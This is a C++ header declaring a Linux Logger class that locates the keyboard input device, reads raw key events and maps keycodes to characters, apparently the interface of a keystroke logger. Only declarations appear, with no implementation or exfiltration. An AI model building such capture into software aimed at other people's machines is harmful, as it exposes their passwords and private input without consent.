// logger.h

#ifndef logger_h
#define logger_h

#include <linux/input.h>
#include <unordered_map>

#include <chrono>
#include <functional>
#include <future>
#include <iostream>
#include <string>
#include <thread>

class Logger {
public:
	static Logger& get_instance();

	Logger(Logger const&)            = delete;
	Logger& operator=(Logger const&) = delete;

	auto init(std::string const& event_ID = "") -> bool;
	auto check_init() const -> bool;

	auto start() -> void;
	auto kill() -> void;

private:
	Logger();
	~Logger();

	int                                                                         fd_;
	bool                                                                        initialized_;
	std::string                                                                 ev_init_;
	bool                                                                        running_;
	const std::unordered_map<unsigned int, std::pair<std::string, std::string>> keymap_;

	template<class _Rep, class _Period>
	auto async_timer(std::chrono::duration<_Rep, _Period> duration, std::function<void()> callback) -> std::future<void>;
	auto fd_monitor(signed int fd, fd_set fds) -> signed int;

	auto find_kbd() -> std::string;
	auto ev_reader() -> void;
	auto get_keychar(unsigned int code) -> std::string;
};

#endif // logger_h
